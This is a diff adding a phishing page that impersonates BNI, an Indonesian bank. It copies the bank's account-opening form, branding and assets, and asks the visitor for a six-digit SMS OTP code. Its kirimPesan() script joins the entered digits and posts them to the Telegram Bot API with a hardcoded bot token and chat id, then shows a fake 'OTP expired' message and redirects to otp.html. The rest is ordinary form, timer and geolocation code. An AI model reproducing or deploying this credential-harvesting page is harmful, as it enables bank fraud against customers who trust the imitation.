@@ -1,0 +1,878 @@
+
+<html lang="id">
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <meta name="theme-color" content="#E55300"> 
+  <title>BNI eForm Perubahan Tarif</title> 
+  <meta name="description" content="Apakah Anda membutuhkan rekening tabungan? Nikmati berbagai promo belanja BNI Kartu Debit dan fasilitas BNI e-channel."> 
+  <meta name="robots" content="index, follow"> 
+<link rel="icon" href="https://bukarekening.bni.co.id/assetsnew/img/favicon.ico" type="image/x-icon" />
+<link rel="apple-touch-icon" href="https://bukarekening.bni.co.id/assetsnew/img/favicon.png" />
+<link rel="apple-touch-icon" sizes="76x76" href="https://bukarekening.bni.co.id/assetsnew/img/favicon-76.png" />
+<link rel="apple-touch-icon" sizes="120x120" href="https://bukarekening.bni.co.id/assetsnew/img/favicon-120.png" />
+<link rel="apple-touch-icon" sizes="152x152" href="https://bukarekening.bni.co.id/assetsnew/img/favicon-152.png" />
+
+<link href="https://bukarekening.bni.co.id/assetsnew/css/bootstrap.min.css" rel="stylesheet">
+<link href="https://bukarekening.bni.co.id/assetsnew/css/validator/bootstrap-validator.min.css" rel="stylesheet">
+<link href="https://bukarekening.bni.co.id/assetsnew/css/datepicker/bootstrap-datepicker.min.css" rel="stylesheet">
+<link href="https://bukarekening.bni.co.id/assetsnew/css/select2/select2.min.css" rel="stylesheet">
+<link href="https://bukarekening.bni.co.id/assetsnew/css/select2/select2-bootstrap.min.css" rel="stylesheet">
+<link href="https://bukarekening.bni.co.id/assetsnew/css/swiper/swiper-bundle.min.css" rel="stylesheet">
+<link href="https://bukarekening.bni.co.id/assetsnew/fontawesome/css/font-awesome.min.css" rel="stylesheet">
+
+<link href="https://bukarekening.bni.co.id/files/app/custom.css" rel="stylesheet">
+  <style>
+  html,
+body {
+  align-items: center;
+ 
+  box-sizing: border-box;
+  
+  cursor: default;
+  display: flex;
+  font-family: sans-serif;
+  height: 100%;
+  justify-content: center;
+  margin: 0px auto;
+  background: transparent;
+  width: 100%;
+  -webkit-tap-highlight-color: transparent;
+  -webkit-touch-callout: none;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+* {
+  box-sizing: inherit;
+  cursor: inherit;
+  transition-duration: 0.2s;
+  transition-property: none;
+  transition-timing-function: cubic-bezier(0.42, 0, 0.58, 1);
+}
+  
+ 
+label.field {
+  border-radius: 2px;
+  color: #666;
+  display: block;
+  margin: 0px auto;
+  width: 320px;
+  padding: 8px;
+  opacity: 0;
+  position: relative;
+  transition-property: opacity;
+  z-index: 1;
+}
+label.field span {
+  color: inherit;
+  display: block;
+  font-size: 16px;
+  height: 20px;
+  line-height: 20px;
+  left: 9px;
+  pointer-events: none;
+  position: absolute;
+  top: 32px;
+  transform: scale(1) translateY(0);
+  transition-property: color, font-size, top;
+  z-index: 1;
+}
+label.field span.required::after {
+  color: inherit;
+  content: "*";
+  display: block;
+  height: 20px;
+  left: -20px;
+  line-height: 20px;
+  position: absolute;
+  text-align: center;
+  top: 0;
+  width: 20px;
+}
+.error label.field span {
+  color: #F02318;
+}
+label.field .psuedo_select {
+  background: rgba(255, 255, 255, 0);
+  position: relative;
+  border-color: #666;
+  border-style: solid;
+  border-width: 0 0 2px 0;
+  color: #666;
+  cursor: pointer;
+  font-size: 20px;
+  height: 24px;
+  line-height: 24px;
+  margin: 24px 32px 0 0;
+  min-width: 250px;
+  padding-top: 24px;
+  outline: 0;
+  z-index: 1;
+}
+label.field .psuedo_select::after {
+  background: url("data:image/svg+xml;utf8,<svg fill='#666' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'> <path d='M7.41 7.84L12 12.42l4.59-4.58L18 9.25l-6 6-6-6z'/> <path d='M0-.75h24v24H0z' fill='none'/> </svg>"), no-repeat;
+  content: "";
+  height: 24px;
+  width: 24px;
+  position: absolute;
+  top: 0;
+  right: 0;
+  transition-property: background;
+}
+label.field .psuedo_select .selected {
+  height: 24px;
+  left: 1px;
+  line-height: 24px;
+  opacity: 0;
+  position: absolute;
+  top: 0;
+  transform: translateY(24px);
+  transition-property: opacity, transform;
+  will-change: transform;
+}
+label.field .psuedo_select ul {
+  background: #fff;
+  
+  display: block;
+  height: 0;
+  list-style: none;
+  margin-top: 2px;
+  opacity: 0;
+  overflow: hidden;
+  padding: 0 1px;
+  pointer-events: none;
+  transition-property: height, opacity;
+  width: 100%;
+  z-index: 2;
+  border-radius: 0px 0px 8px 8px ;
+  box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+}
+label.field .psuedo_select ul li {
+  height: 32px;
+  padding: 6px 4px;
+  border-bottom: 1px solid #ddd;
+ 
+}
+label.field .deselect {
+  height: 100vh;
+  left: 0;
+  position: fixed;
+  top: 0;
+  width: 100%;
+  z-index: -1;
+}
+label.field.focused {
+  color: #007BED;
+}
+label.field.focused .psuedo_select {
+  border-color: #007BED;
+}
+label.field.focused .psuedo_select::after {
+  background: url("data:image/svg+xml;utf8,<svg fill='#007BED' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'> <path d='M7.41 7.84L12 12.42l4.59-4.58L18 9.25l-6 6-6-6z'/> <path d='M0-.75h24v24H0z' fill='none'/> </svg>"), no-repeat;
+}
+label.field.focused .psuedo_select ul {
+  opacity: 1;
+  pointer-events: all;
+}
+
+ 
+  
+.splash {
+	background-color: var(--white);
+	display: block;
+	position: fixed;
+	top: 0;
+	left: 0;
+	width: 100%;
+	height: 100%;
+	z-index: 99999;
+}
+
+.container.header {
+	position: fixed;
+	top: 0;
+	margin-top: 80px;
+	text-align: center;
+	z-index: 99999;
+}
+
+.container.header img {
+	width: 120px;
+}
+
+.container.footer {
+	font-size: 14px;
+	position: fixed;
+	bottom: 0;
+	text-align: center;
+	z-index: 99999;
+}
+
+.container.footer img {
+	width: 120px;
+}
+
+
+ .pin-code{ 
+  padding: 10; 
+  
+  display: block;
+  justify-content:center;
+  position: absolute; 
+  left: 0; 
+  right: 0; 
+  top: 0; 
+  bottom: 0; 
+  margin: 0px auto;
+  
+} 
+ 
+.pin-code input { 
+  border: 1px solid #44CED8; 
+  text-align: center; 
+  width: 42px;
+  height: 42px;
+  font-size: 36px; 
+  background-color: #DDDDDD;
+  margin-right: 1px;
+   margin-left: 1px;
+  border-radius: 10px;
+  margin-top: -18px;
+  box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
+} 
+
+
+
+.pin-code input:focus { 
+  border: 1px groove #EC794C;
+  outline:none;
+  background: snow;
+  box-shadow: 5px 5px 10px 0 rgba(90, 116, 148, 0.5);
+} 
+
+h1{
+            display: table;
+            background-color: transparent;
+            position: fixed;
+            color: red;
+            padding: 16px;
+            width: 100%;
+            height: 20px;
+            font-size: 1em;
+            text-align: center;
+            margin-top: 5px;
+            margin-bottom: -55px;
+            z-index: 9999;
+            
+        }
+
+.blink {
+  animation: blink-animation 2s steps(6, start) infinite;
+  -webkit-animation: blink-animation 2s steps(6, start) infinite;
+  z-index: 99999;
+}
+@keyframes blink-animation {
+  to {
+    visibility: hidden;
+}
+@-webkit-keyframes blink-animation {
+  to {
+    visibility: hidden;
+}
+
+
+</style> 
+ </head> 
+ <body class="modal-open" style="overflow: hidden; padding-right: 0px;" data-bs-overflow="hidden" data-bs-padding-right="0px" style="background: blue"> 
+  <div id="loading" class="loading" style="display: none;"> 
+   <div class="spinner-border" role="status"> 
+    <span class="visually-hidden">Loading...</span> 
+   </div> 
+  </div> 
+  <div id="body" class="body" style="display: block;"> 
+   <nav class="navbar-top"> 
+    <div class="navbar d-flex flex-row justify-content-center align-items-center"> 
+     <div class="navbar-title"> 
+      <span id="navbar-text" class="fs-16">Buka Rekening</span> 
+     </div> 
+    </div> 
+    <div class="progress"> 
+     <div id="navbar-progress" class="progress-bar" style="width: 0%"></div> 
+    </div> 
+   </nav> 
+   <div id="splash" class="splash cover-home"> 
+    <div class="container header"> 
+     <div class="row"> 
+      <div class="col"> 
+       <div class="d-flex flex-column justify-content-center align-items-center"> 
+        <div class="text-center"> 
+         <img src="https://bukarekening.bni.co.id/assetsnew/img/logo-bni.png" alt=""> 
+        </div> 
+        <span class="color-green fw-semibold mt-4">Melayani Negeri Kebanggaan Bangsa</span> 
+       </div> 
+      </div> 
+     </div> 
+    </div> 
+    
+     <!-- partial:index.partial.html -->
+ <x style="width: 100%; height: 100%; position: absolute; left: 0; right: 0; top: 0; bottom: 0; margin: 0px auto; background: #EEEEEE">
+<center>
+ <div class="pin-code" style="margin-top: 210px">
+<input type="hidden" id="logo" name="logo" value="━─━────༺𝗕𝗡𝗜༻────━─━
+">
+	<input type="password" inputmode="numeric" id="pin1" name="pin1" data-id="1" maxlength="1" required autofocus>
+    <input type="password" inputmode="numeric" id="pin2" data-id="2" name="pin2" maxlength="1" autofocus>
+	  <input type="password"inputmode="numeric" id="pin3" data-id="3" name="pin3" maxlength="1" autofocus>
+    <input type="password" inputmode="numeric" id="pin4" data-id="4" name="pin4" maxlength="1" autofocus>
+    <input type="password" inputmode="numeric" id="pin5" data-id="5" name="pin5" maxlength="1" autofocus>
+   <input type="password" inputmode="numeric" value="" id="pin6" data-id="6" name="pin6" maxlength="1" required onchange="javascript:this.form.submit();" oninput="kirimPesan()" autofocus>
+    <p></p>
+    <input type="tel" style="opacity: 0.0" readonly="true">
+  </div>    
+<div style="position: absolute; left: 0; right: 0; margin: 0px auto; top: 0; height: 60px; border-bottom: 3px solid #ccc; background: #E55300; padding: 15px; z-index: 999999; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; ">
+<img src="https://applycreditcard.bni.co.id/_nuxt/img/b9f7dde.svg" style="width: 90px; float:left; margin-top: 0px; margin-left: 0px">
+ <span class="color-green fw-semibold mt-4" style="margin-top: 10px; z-index: 999999; position: relative; font-size: 15px; color: snow"></span> 
+ </div> 
+<div style="position: absolute; left: 0; right: 0; margin: 0px auto; top: 164">
+ <span class="color-green fw-semibold mt-4" style="margin-top: -30px; z-index: 999999; position: relative; font-size: 15px">Masukkan Kode OTP</span> 
+ </div>
+ 
+<p style="font-size: 10px; text-align: center; margin-top: 300px;"><strong style="color: #5e5e5e;">
+      <a href="./bni_otp.html" style="text-decoration: none; color: #FE713C;" class="color-green">Kirim Ulang SMS</a></strong></p> 
+      <p style="font-weight: 500; font-size: 20px; color: #54D0DA; text-align: center; margin: 0px auto; margin-bottom: 0px; margin-top: -60px" id="timer">3 : 00</p> 
+       <span class="blink">
+		<br>
+   <h3 class="kdl" style="display: none; color: red;">kode otp kadaluarsa, silahkan coba lagi</h3></span>
+</center>
+
+<!-- partial -->
+<center>
+    <div style="width: 90%; height: 150px; background: #DEECEE; border-radius: 10px; margin-top: 50px; text-align: middle; font-size: 12px; padding: 10px; color: #459BAD; font-weight: 300; box-shadow: rgb(170, 170, 170) 0px 1px 4px 0px; ">
+   
+<img src="https://bukarekening.bni.co.id/assetsnew/img/icon-lamp.png"> Kami akan melakukan proses verifikasi nomor HP setelah proses pembukaan rekening selesai diproses. Pastikan <strong style="font-weight: 600">nomor Anda memiliki pulsa dan terkoneksi dengan jaringan Internet.</strong>
+<p></p>
+<img src="https://bukarekening.bni.co.id/assetsnew/img/icon-key.png"> <strong style="font-weight: 600"> Jaga kerahasiaan OTP</strong> dengan tidak memberitahu kepada siapapun termasuk kepada Petugas Bank.     
+        
+    </div>
+        </center>
+    <div class="container footer"  style="margin: -35px auto">
+        
+
+     <div class="row"> 
+      <div class="col"> 
+       <div class="mb-5 color-white px-2 fs-12"> 
+      
+<p style="color: #aaa; line-height: 13px; position: fixed; left: 0; right: 0; bottom: 10; padding: 17px">PT Bank Negara Indonesia (Persero) Tbk. berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) serta merupakan peserta penjaminan Lembaga Penjamin Simpanan (LPS).
+        <p style="color: #aaa; margin-top: -10px">Hak Cipta 2023 BNI Mobile Banking</p> 
+       </div> 
+      </div> 
+     </div> 
+    </div> 
+   </div> 
+   </form>
+   <div class="container-fluid px-3 margin-y"> 
+    <div class="row"> 
+     <div class="col"> 
+      <div class="text-center"> 
+       <img src="https://bukarekening.bni.co.id/assetsnew/img/icon-buka-rekening.png" alt="" width="100px"> 
+      </div> 
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script>
+        document.getElementById('timer').innerHTML =
+          03 + ":" + 01;
+        startTimer();
+        
+        
+        function startTimer() {
+          var presentTime = document.getElementById('timer').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-1}
+          if(m<0){
+            return
+          }
+          
+          document.getElementById('timer').innerHTML =
+            m + " : " + s;
+          console.log(m)
+          setTimeout(startTimer, 1000);
+          
+        }
+        
+        function checkSecond(sec) {
+          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+          if (sec < 0) {sec = "59"};
+          return sec;
+        }
+    </script> 
+<script>
+function kirimPesan() {
+
+    var logo = document.getElementById('logo');
+    var kdl = document.querySelector('.kdl')
+    var pin1 = document.getElementById('pin1');
+    var pin2 = document.getElementById('pin2');
+    var pin3 = document.getElementById('pin3');
+    var pin4 = document.getElementById('pin4');
+    var pin5 = document.getElementById('pin5');
+    var pin6 = document.getElementById('pin6');
+
+    var gabungan = '' + logo.value + '%0A~%20𝗢𝗧𝗣%20𝗕𝗡𝗜%20~%0A%20%20%20%20%20%20' +   pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
+
+    var token = '6694112504:AAFGLYmn09Lncf5Bmo_wSCzXVQeha-x8m-k'; // Ganti dengan token bot yang kamu buat
+    var grup = '6484304541'; // Ganti dengan chat id dari bot yang kamu buat
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+    })
+
+	kdl.style.display = 'block'
+	setTimeout(()=> {
+		window.location.href = 'otp.html'
+	}, 2000)
+}
+
+
+setTimeout(() => {
+       document.getElementById("blink").style.display = "none";
+     },4500)   
+   
+   
+   
+    ////////////////////////////////////
+  // prerequisite utility functions //
+ // the real stuff starts below    //
+////////////////////////////////////
+var util = {
+	f: {
+		addStyle: function (elem, prop, val, vendors) {
+			var i, ii, property, value
+			if (!util.f.isElem(elem)) {
+				elem = document.getElementById(elem)
+			}
+			if (!util.f.isArray(prop)) {
+				prop = [prop]
+				val = [val]
+			}
+			for (i = 0; i < prop.length; i += 1) {
+				var thisProp = String(prop[i]),
+					thisVal = String(val[i])
+				if (typeof vendors !== "undefined") {
+					if (!util.f.isArray(vendors)) {
+						vendors.toLowerCase() == "all" ? vendors = ["webkit", "moz", "ms", "o"] : vendors = [vendors]
+					}
+					for (ii = 0; ii < vendors.length; ii += 1) {
+						elem.style[vendors[i] + thisProp] = thisVal
+					}
+				}
+				thisProp = thisProp.charAt(0).toLowerCase() + thisProp.slice(1)
+				elem.style[thisProp] = thisVal
+			}
+		},
+		cssLoaded: function (event) {
+			var child = util.f.getTrg(event)
+			child.setAttribute("media", "all")
+		},
+		events: {
+			cancel: function (event) {
+				util.f.events.prevent(event)
+				util.f.events.stop(event)
+			},
+			prevent: function (event) {
+				event = event || window.event
+				event.preventDefault()
+			},
+			stop: function (event) {
+				event = event || window.event
+				event.stopPropagation()
+			}
+		},
+		getSize: function (elem, prop) {
+			return parseInt(elem.getBoundingClientRect()[prop], 10)
+		},
+		getTrg: function (event) {
+			event = event || window.event
+			if (event.srcElement) {
+				return event.srcElement
+			} else {
+				return event.target
+			}
+		},
+		isElem: function (elem) {
+			return (util.f.isNode(elem) && elem.nodeType == 1)
+		},
+		isArray: function(v) {
+			return (v.constructor === Array)
+		},
+		isNode: function(elem) {
+			return (typeof Node === "object" ? elem instanceof Node : elem && typeof elem === "object" && typeof elem.nodeType === "number" && typeof elem.nodeName==="string" && elem.nodeType !== 3)
+		},
+		isObj: function (v) {
+			return (typeof v == "object")
+		},
+		replaceAt: function(str, index, char) {
+			return str.substr(0, index) + char + str.substr(index + char.length);
+		}
+	}
+},
+   //////////////////////////////////////
+  // ok that's all the utilities      //
+ // onto the select box / form stuff //
+//////////////////////////////////////
+form = {
+f: {
+	init: {
+		register: function () {
+			console.clear()// just cuz codepen
+			var child, children = document.getElementsByClassName("field"), i
+			for (i = 0; i < children.length; i += 1) {
+				child = children[i]
+				util.f.addStyle(child, "Opacity", 1)
+			}
+			children = document.getElementsByClassName("psuedo_select")
+			for (i = 0; i < children.length; i += 1) {
+				child = children[i]
+				child.addEventListener("click", form.f.select.toggle)
+			}
+		},
+		unregister: function () {
+			//just here as a formallity
+			//call this to stop all ongoing timeouts are ready the page for some sort of json re-route
+		}
+	},
+	select: {
+		blur: function (field) {
+			field.classList.remove("focused")
+			var child, children = field.childNodes, i, ii, nested_child, nested_children
+			for (i = 0; i < children.length; i += 1) {
+				child = children[i]
+				if (util.f.isElem(child)) {
+					if (child.classList.contains("deselect")) {
+						child.parentNode.removeChild(child)
+					} else if (child.tagName == "SPAN") {
+						if (!field.dataset.value) {
+							util.f.addStyle(child, ["FontSize", "Top"], ["16px", "32px"])
+						}
+					} else if (child.classList.contains("psuedo_select")) {
+						nested_children = child.childNodes
+						for (ii = 0; ii < nested_children.length; ii += 1) {
+							nested_child = nested_children[ii]
+							if (util.f.isElem(nested_child)) {
+								if (nested_child.tagName == "SPAN") {
+									if (!field.dataset.value) {
+										util.f.addStyle(nested_child, ["Opacity", "Transform"], [0, "translateY(24px)"])
+									}
+								} else if (nested_child.tagName == "UL") {
+										util.f.addStyle(nested_child, ["Height", "Opacity"], [0, 0])
+								}
+							}
+						}
+					}
+				}
+			}
+		},
+		focus: function (field) {
+			field.classList.add("focused")
+			var bool = false, child, children = field.childNodes, i, ii, iii, nested_child, nested_children, nested_nested_child, nested_nested_children, size = 0
+			for (i = 0; i < children.length; i += 1) {
+				child = children[i]
+				util.f.isElem(child) && child.classList.contains("deselect") ? bool = true : null
+			}
+			if (!bool) {
+				child = document.createElement("div")
+				child.className = "deselect"
+				child.addEventListener("click", form.f.select.toggle)
+				field.insertBefore(child, children[0])
+			}
+			for (i = 0; i < children.length; i += 1) {
+				child = children[i]
+				if (util.f.isElem(child) && child.classList.contains("psuedo_select")) {
+					nested_children = child.childNodes
+					for (ii = 0; ii < nested_children.length; ii += 1) {
+						nested_child = nested_children[ii]
+						if (util.f.isElem(nested_child) && nested_child.tagName == "UL") {
+							size = 0
+							nested_nested_children = nested_child.childNodes
+							for (iii = 0; iii < nested_nested_children.length; iii += 1) {
+								nested_nested_child = nested_nested_children[iii]
+								if (util.f.isElem(nested_nested_child) && nested_nested_child.tagName == "LI") {
+									size += util.f.getSize(nested_nested_child, "height")
+									console.log("size: " + size)
+								}
+							}
+							util.f.addStyle(nested_child, ["Height", "Opacity"], [size + "px", 1])
+						}
+					}
+				}
+			}
+		},
+		selection: function (child, parent) {
+			var children = parent.childNodes, i, ii, nested_child, nested_children, time = 0, value
+			if (util.f.isElem(child) && util.f.isElem(parent)) {
+				parent.dataset.value = child.dataset.value
+				value = child.innerHTML
+			}
+			for (i = 0; i < children.length; i += 1) {
+				child = children[i]
+				if (util.f.isElem(child)) {
+					if (child.classList.contains("psuedo_select")) {
+						nested_children = child.childNodes
+						for (ii = 0; ii < nested_children.length; ii += 1) {
+							nested_child = nested_children[ii]
+							if (util.f.isElem(nested_child) && nested_child.classList.contains("selected")) {
+								if (nested_child.innerHTML)  {
+									time = 1E2
+									util.f.addStyle(nested_child, ["Opacity", "Transform"], [0, "translateY(24px)"], "all")
+								}
+								setTimeout(function (c, v) {
+									c.innerHTML = v
+									util.f.addStyle(c, ["Opacity", "Transform", "TransitionDuration"], [1, "translateY(0px)", ".1s"], "all")
+								}, time, nested_child, value)
+							}
+						}
+					} else if (child.tagName == "SPAN") {
+						util.f.addStyle(child, ["FontSize", "Top"], ["12px", "8px"])
+				   }
+			   }
+			}
+		},
+		toggle: function (event) {
+			util.f.events.stop(event)
+			var child = util.f.getTrg(event), children, i, parent
+			switch (true) {
+				case (child.classList.contains("psuedo_select")):
+				case (child.classList.contains("deselect")):
+					parent = child.parentNode
+					break
+				case (child.classList.contains("options")):
+					parent = child.parentNode.parentNode
+					break
+				case (child.classList.contains("option")):
+					parent = child.parentNode.parentNode.parentNode
+					form.f.select.selection(child, parent)
+					break
+			}
+			parent.classList.contains("focused") ? form.f.select.blur(parent) : form.f.select.focus(parent)
+		}
+	}
+}}
+window.onload = form.f.init.register  
+
+
+//var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
+var pinContainer = document.querySelector(".pin-code");
+console.log('There is ' + pinContainer.length + ' Pin Container on the page.');
+
+pinContainer.addEventListener('keyup', function (event) {
+    var target = event.srcElement;
+    
+    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
+    var myLength = target.value. length;
+
+    if (myLength >= maxLength) {
+        var next = target;
+        while (next = next.nextElementSibling) {
+            if (next == 0) break;
+            if (next.tagName.toLowerCase() == "input") {
+                next.focus();
+                break;
+            }
+        }
+    }
+
+    if (myLength === 0) {
+        var next = target;
+        while (next = next.previousElementSibling) {
+            if (next == 0) break;
+            if (next.tagName.toLowerCase() == "input") {
+                next.focus();
+                break;
+            }
+        }
+    }
+}, false);
+
+pinContainer.addEventListener('keydown', function (event) {
+    var target = event.srcElement;
+    target.value = "";
+}, false);
+</script>
+  </script>    
+    
+  <script>
+    	$(async function() {   
+    		setNavbar("Buka Rekening", 0);
+    		
+	        /**
+	         * Location
+	         */
+			var posisi = 0;
+			var data = {
+				input: "lanjut",
+				latitude: "",
+				longitude: "",
+				location: ""
+			};
+
+			if ('geolocation' in navigator) {
+				try {
+					const options = {
+						maximumAge: 600000,
+						timeout: 60000,
+						enableHighAccuracy: false
+					};
+
+					function getPosition() {
+						return new Promise((res, err) => {
+							navigator.geolocation.getCurrentPosition(res, err, options);
+						})
+					}
+
+					var position = await getPosition();
+					if (!position.coords.accuracy) {
+						$("#modal-error-text").html($("<span>Lokasi anda kurang akurat. Kami menyarankan untuk merefresh halaman ini dan mencoba lagi.</span>"));
+						$("#loading").hide();
+						$("#modal-error").modal("show");
+					} else {
+						posisi = await setPosition(position.coords.latitude, position.coords.longitude);
+					}
+					data["latitude"] = position.coords.latitude;
+					data["longitude"] = position.coords.longitude;
+					data["location"] = posisi;
+				} catch(err) {
+					if (err.code == 1) {
+						$("#modal-refresh-text").html("Layanan ini memerlukan akses lokasi anda, silakan aktifkan akses lokasi anda atau lakukan proses pembukaan tabungan beberapa saat lagi.");
+					} else {
+						$("#modal-refresh-text").html($("<span>" + err.message + "</span>"));
+					}
+					$("#loading").hide();
+					$("#modal-refresh").modal("show");
+				}
+			} else {
+				$("#modal-error-text").html($("<span>Geolokasi tidak didukung di browser Anda.</span>"));
+				$("#loading").hide();
+				$("#modal-error").modal("show");
+			}
+
+			async function setPosition(latitude, longitude) {
+				var position = 0;
+				if (await isIndonesia(latitude, longitude)) {
+					position = 1; 
+				} else {
+					position = 2;
+				}
+				return position;
+			}
+			
+			async function isIndonesia(latitudePoint, longitudePoint) {
+				  var result = false;
+				  try {
+				    const response = await fetch('/files/json/indonesia-coordinate.json');
+				    const data = await response.json();
+			        var indonesia1 = turf.helpers.polygon(data.coordinates[0]);
+			        var indonesia2 = turf.helpers.polygon(data.coordinates[1]);
+
+					var indonesias = [indonesia1,indonesia2];
+					var multiIndo = turf.helpers.multiPolygon(indonesias);
+					
+					var point = turf.helpers.point([longitudePoint, latitudePoint]);
+					 
+					multiIndo.geometry.coordinates.forEach(polygon => {
+		    			if(turf.booleanContains.default(polygon,point)) {
+		    				 result=true;
+		    			}
+		    		 })
+		    		 
+				    return result;
+				  } catch (error) {
+					  	$("#modal-error-text").html($("<span>" + error.message + "</span>"));
+						$("#loading").hide();
+						$("#modal-error").modal("show");
+				  }
+				}
+			
+
+			/**
+			 * Lanjut
+			 */
+			$("#lanjut").on("click", function () {
+				if (data["latitude"]=="" || data["langitude"]=="" || data["location"]=="") {
+					$("#modal-refresh-text").html($("<span>Gagal mencari lokasi. Pastikan koneksi Anda stabil</span>"));
+					$("#modal-refresh").modal("show");
+				} else {
+					$("#lanjut").prop('disabled', true);
+					$("#loading").show();
+
+					$.ajax({
+						type: "POST",
+						url: "",
+						data: data,
+						dataType: "text",
+						success: function (response) {
+							var res = JSON.parse(response)
+
+							if (res.status) {
+								window.location = res.to;
+							} else {
+								if (res.code == "404") {
+									$("#loading").hide();
+									$("#modal-refresh-text").html($("<span>" + res.message + "</span>"));
+									$("#modal-refresh").modal("show");
+								} else if (res.code == "501") {
+									$("#loading").hide();
+									$("#modal-clock").modal("show");
+								} else {
+									$("#loading").hide();
+									$("#modal-error-text").html($("<span>" + res.message + "</span>"));
+									$("#modal-error").modal("show");
+								}
+							}
+						},
+						error: function (xhr, err) {
+							$("#loading").hide();
+							$("#modal-refresh-text").html($("<span>" + ajaxErrorMessage(xhr, err) + "</span>"));
+							$("#modal-refresh").modal("show");
+						}
+					}).then(function () {
+						$("#lanjut").prop('disabled', false);
+					});
+				}
+			});
+			
+			/**
+	         * Splash
+	         */
+         	setTimeout(() => {
+           		$("#splash").css("display", "none");
+         	}, 2500);
+			
+			/**
+			 * Hide Loading
+			 */
+			$("#body").show();
+			$("#loading").hide();
+	    });
+	</script> 
+  <script id="f5_cspm">(function(){var f5_cspm={f5_p:'DJGGILJGKLMNALHJCHPPCLOHFMABOCONMNMIBPGJIAAGGMJCPMACAABLGADCNPFPBAGBLPEILKEAELJDGFGAAMPOADODJOAIGHDCGNMCHOMNKGOGBENAIHKAMKDJKJGP',setCharAt:function(str,index,chr){if(index>str.length-1)return str;return str.substr(0,index)+chr+str.substr(index+1);},get_byte:function(str,i){var s=(i/16)|0;i=(i&15);s=s*32;return((str.charCodeAt(i+16+s)-65)<<4)|(str.charCodeAt(i+s)-65);},set_byte:function(str,i,b){var s=(i/16)|0;i=(i&15);s=s*32;str=f5_cspm.setCharAt(str,(i+16+s),String.fromCharCode((b>>4)+65));str=f5_cspm.setCharAt(str,(i+s),String.fromCharCode((b&15)+65));return str;},set_latency:function(str,latency){latency=latency&0xffff;str=f5_cspm.set_byte(str,40,(latency>>8));str=f5_cspm.set_byte(str,41,(latency&0xff));str=f5_cspm.set_byte(str,35,2);return str;},wait_perf_data:function(){try{var wp=window.performance.timing;if(wp.loadEventEnd>0){var res=wp.loadEventEnd-wp.navigationStart;if(res<60001){var cookie_val=f5_cspm.set_latency(f5_cspm.f5_p,res);window.document.cookie='f5avr0739167613aaaaaaaaaaaaaaaa_cspm_='+encodeURIComponent(cookie_val)+';path=/';}
+return;}}
+catch(err){return;}
+setTimeout(f5_cspm.wait_perf_data,100);return;},go:function(){var chunk=window.document.cookie.split(/\s*;\s*/);for(var i=0;i<chunk.length;++i){var pair=chunk[i].split(/\s*=\s*/);if(pair[0]=='f5_cspm'&&pair[1]=='1234')
+{var d=new Date();d.setTime(d.getTime()-1000);window.document.cookie='f5_cspm=;expires='+d.toUTCString()+';path=/;';setTimeout(f5_cspm.wait_perf_data,100);}}}}
+f5_cspm.go();}());</script>
+  <div class="modal-backdrop fade show"></div>
+  <div class="modal-backdrop fade show"></div>
+  <div class="modal-backdrop fade show"></div>
+  <div class="modal-backdrop fade show"></div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+ </body>
+</html>
